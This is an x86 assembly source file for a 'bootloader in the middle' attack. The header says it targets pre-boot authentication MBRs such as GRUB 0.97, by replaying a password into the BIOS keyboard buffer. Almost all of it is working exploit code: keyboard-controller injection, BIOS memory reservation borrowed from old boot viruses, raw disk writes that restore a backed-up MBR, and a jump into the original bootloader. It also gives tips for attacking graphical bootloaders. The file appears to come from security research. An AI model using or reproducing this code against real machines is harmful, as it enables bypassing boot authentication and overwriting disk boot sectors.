;
;               [ Attack of the Invisible Man ]
;                 (bootloader in the middle)
;
; Generic rebooting attack against pre-boot authentication MBRs
; that do not initialize BIOS keyboard memory.
;
;  Jonathan Brossard -- jb@endrazine.com // endrazine@gmail.com
;
;
;
; ROADMAP :
; 
;   Use delta offset[0] trick to find self location in memory.
;   Fill the BIOS keyboard buffer using PIC 8042[1].
;   Allocate a 5 Kb buffer in RAM reserved to the BIOS.
;   Find first bootable disk.
;   Read old MBR backup in reserved RAM.
;   Patch disk with old MBR.
;   Load MBR in Ram at address 0x0000:0x7c00
;   Unallocate BIOS memory if possible
;   Jump to 0x0000:0x7c00
;
; NOTES :
;   Since some BIOS/virtual machines do not follow the standards
;   and do check/modify memory when calling int 0x19, we will
;   emulate it by loading the MBR in Ram and jumping to it.
;
;   Since we patch an actual MBR instead of crafting one from scratch,
;   size does matter. The initial jump of the MBR is a jmp short, so
;   it might be up to 128b long; we also need to keep the latest two
;   bytes that mark the disk as bootable, hence , we roughly have :
;   512 - 128 - 2 = 382 bytes available if we want to stick to one sector.
;
; TODO : remove MBR backup
;
; [0] Cf: 80's/90's virii writting tutorials a la 40hex, 
;     virii source code like Stone or the Italian Virus,
;     Dark Avenger virii's source code.
;     http://www.etext.org/zines/ASCII/40hex/
;
; [1] Art of Assembly Language: Chapter Twenty, Randall Hyde
;     http://webster.cs.ucr.edu/AoA/DOS/ch20/CH20-1.html
;
;
; Tested against:
; * Grub 0.97 with MD5 hashes, under Gentoo 2006
; * Grub 0.97 with MD5 hashes, under fedora release 7 (Moonshine)
;       (vulnerable in both text and graphical modes)
;
; TIP :
;  just add a few 'escape' characters before the password if you
;  attack a bootloader with graphical display like grub.
;
;
;

org 0x100


section .text 


_start:
	nop
	nop
realstart:

        jmp short DeltaCall          ; good old delta offset trick

getdelta:

	pop bx
	jmp short afterroutinesjump

DeltaCall:                           ; dummy call to get delta offset
        call getdelta

;
; Save usefull data here
;

returnaddress:	db 0x00, 0x00
password	db 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
                db 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                db 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                db 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                db 0x00

;------------------ [ keyboard filling subroutines ] ------------------
;  Credit for those routines :
;    Art of Assembly Language: Chapter Twenty, Randall Hyde
;    http://webster.cs.ucr.edu/AoA/DOS/ch20/CH20-1.html
;

write_to_bios_buffer:

	mov dl, al
	xor cx, cx

wait_controler:			; Wait untill microcontroler's
	in al, 0x64             ; control buffer is empty
	test al, 1
	loopnz wait_controler

; disable the keayboard

	cli                     ; disable interrupts
	in al, 0x21             ; get current mask
	push ax
	or al, 2                ; mask keyboard interrupt
	out 0x21, al

	call wait_controler2
	mov al, 0x60            ; "send keyboard" command
	out 0x64, al

; send the scancode as a new command :

	call wait_controler2
	mov al, dl
	out 0x60, al

	call wait_controler2
	mov al, 0x20         ; "send keyboard" command
	out 0x64, al

	xor cx, cx

wait_if_full:                ; wait until the controler
	in al, 0x64          ; is accepting data
	test    al, 1
	loopz   wait_if_full

	call wait_controler2
	mov al, 0x60
	out 0x64, al

	call wait_controler2
	mov al, 0x45
	out 0x60, al

fake_int0x09:         
	in al, 0x60
	int 0x09                  ; simulate hardware interrupt

; re enable the keyboard, clean and return

	call wait_controler2
	mov al, 0x0ae
	out 0x64, al              ; re enable the keyboard

	pop ax
	out 0x21, al              ; restore interrupt mask

	ret

wait_controler2:                  ; wait until we can send a command
	push cx                   ; to the microcontroler
	push ax
	xor cx, cx

testcmdport:
	in al, 0x64
	test al, 2                ; check 'buffer is full' flag
	loopnz testcmdport
	pop ax
	pop cx
	ret

;------------------ [ Main code starts here ] ------------------

afterroutinesjump:

;
; Fill up the BIOS keyboard buffer thanks to PIC programming
;
       push bx
       add bx,2;3
       mov si,bx                 ; si points to password
       mov cx,32                 ; max BIOS keyboard buffer size

put_password:                    ; put password in keyboard
       push cs                   ; (without final \x00)
       pop ds

       push cx
       mov al, [ds:si]
       cmp al, 0x00
       je stop_copying

       call write_to_bios_buffer
       inc si
       pop cx
       loop put_password
       push cx                   ; dummy push

stop_copying:
       pop cx                    ; dummy pop
;
; Reserve a 10 Kb memory buffer in the BIOS reserved memory.
; cf: old virii like Stoned, the Italian Virus etc.
;
	xor ax,ax
	mov ds,ax
	mov ax, [ds:0x413]        ; get amound of available memory

	sub ax, 10                ; register 10 Kb of memory
	mov [ds:0x413],ax         ; update BIOS counter

	pop es
	push ax                   ; save counter for desallocation
	push es

	mov cl,06
	shl ax,cl
	mov es,ax                 ; our buffer starts at es:0x00

; find the bootable hard drive :
; read 1 sectors and check if disk is marked
; as bootable on every disk successively

	push es
	xor dx,dx                 ; dl = drive number

readnext:
	inc dl
	mov ah, 0x02              ; read from disk in memory
	mov al, 0x01              ; 1 sector
	mov bx, 0x00;buffer
	mov ch, 0
	mov cl, 1
	mov dh, 0
	int 13h

	cmp ah, 0x00               ; check return value
	jne readnext

	cmp dl, 0x10               ; test 10 drives at max
	je notfound

	cmp byte [es:bx+510], 0x55 ;
	jne readnext               ; Verify the disk is bootable
	cmp byte [es:bx+511], 0xAA ;
	jne readnext               ;
;
; The bootable disk number is in dl, read 20 sectors,
; find our backup and patch the MBR (1 sector).
;
	pop es	
	push es

	mov ah, 0x02                ; function: read
	mov al, 0x14                ; 20 sectors

	mov bx, 0x00; buffer
	mov ch, 0
	mov cl, 1
	mov dh, 0
	int 13h

	cmp ah, 0x00                ; check return value
	jne readnext

	push cs
	pop ds

	pop es

	pop si
	xor bx,bx
	mov bx, [ds:si]             ; return address

; Copy backuped MBR back to sector 1

	mov ah, 0x03                ; function: write
	mov al, 1	            ; 1 sector
	mov ch, 0
	mov cl,1 ;1
	mov dh, 0
	int 13h

;
; Remove backed up MBR
;
	mov ah, 0x03                ; function: write
	mov al, 1	            ; 1 sector
	int 13h

notfound:

	push cs
	pop ds
;
; Jump to our code, in reserved BIOS Ram
;
; We want to do a jmp es:ax, but we'll have
; to code it ourselves...

	push cs
	pop ds

	call bigjump
bigjump:
	pop ax
	add ax,20
	push ax
	pop si

	sub ax,0x7c00
	add ax,4

	mov [ds:si],ax
	mov [ds:si+2],es

	jmp 0xffff:0x0000           ; patched at runtime

	nop                         ; optional nop sled
	nop
	nop
	nop
	nop
	nop
	nop
	nop
;
; Copy bootloader in RAM at position 0x0000:0x7C00
;

	; dl still contains drive number
	mov bx, 0x7c00
	xor ax,ax
	push ax
	pop es

	mov ah, 0x02                ; read from disk in memory
	mov al, 0x01                ; 1 sector
	mov ch, 0
	mov cl, 1
	mov dh, 0
	int 13h
;
; Desallocate memory if no other process has requested
; additional BIOS memory in the meantime

	pop ax                      ; retreive counter from stack
	mov bx, [ds:0x413]          ; get current BIOS mem counter

	cmp ax, bx
	jne skip_desalloc           ; someone else has allocated mem
	
	add ax, 10                ; unallocate 10 Kb of memory
	mov [ds:0x413],ax         ; update BIOS counter
;
; Do not mention the race condition here ;)
; From here, we are executing code that might
; get overwritten anytime. Hopefully, protected
; mode is monoprocess.
;

skip_desalloc:

;
; Jump to original bootloader
;
	jmp 0x0000:0x7c00



;EOF

